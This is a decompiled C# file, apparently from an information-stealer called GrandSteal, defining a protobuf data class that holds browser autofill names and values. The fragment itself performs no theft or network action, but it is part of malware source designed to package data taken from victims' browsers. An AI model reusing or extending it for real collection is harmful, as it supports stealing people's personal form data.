using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using ProtoBuf;

namespace GrandSteal.SharedModels.Models
{
	// Token: 0x02000003 RID: 3
	[ProtoContract(Name = "BrowserAutofill")]
	public class BrowserAutofill : IEqualityComparer<BrowserAutofill>, INotifyPropertyChanged
	{
		// Token: 0x1700000C RID: 12
		// (get) Token: 0x0600001B RID: 27 RVA: 0x00002216 File Offset: 0x00000416
		// (set) Token: 0x0600001C RID: 28 RVA: 0x0000221E File Offset: 0x0000041E
		[ProtoMember(1, Name = "Name")]
		public string Name
		{
			get
			{
				return this._name;
			}
			set
			{
				this._name = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("Name"));
			}
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x0600001D RID: 29 RVA: 0x00002242 File Offset: 0x00000442
		// (set) Token: 0x0600001E RID: 30 RVA: 0x0000224A File Offset: 0x0000044A
		[ProtoMember(2, Name = "Value")]
		public string Value
		{
			get
			{
				return this._value;
			}
			set
			{
				this._value = value;
				PropertyChangedEventHandler expr_0D = this.PropertyChanged;
				if (expr_0D == null)
				{
					return;
				}
				expr_0D(this, new PropertyChangedEventArgs("Value"));
			}
		}

		// Token: 0x14000002 RID: 2
		// (add) Token: 0x0600001F RID: 31 RVA: 0x00003140 File Offset: 0x00001340
		// (remove) Token: 0x06000020 RID: 32 RVA: 0x00003178 File Offset: 0x00001378
		[method: CompilerGenerated]
		[CompilerGenerated]
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x06000021 RID: 33 RVA: 0x0000226E File Offset: 0x0000046E
		public bool Equals(BrowserAutofill x, BrowserAutofill y)
		{
			return x.Name == y.Name && x.Value == y.Value;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000031B0 File Offset: 0x000013B0
		public int GetHashCode(BrowserAutofill obj)
		{
			int num = 14689;
			if (!string.IsNullOrEmpty(obj.Name))
			{
				num += obj.Name.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Value))
			{
				num += obj.Value.GetHashCode();
			}
			return num;
		}

		// Token: 0x0400000D RID: 13
		private string _name;

		// Token: 0x0400000E RID: 14
		private string _value;
	}
}
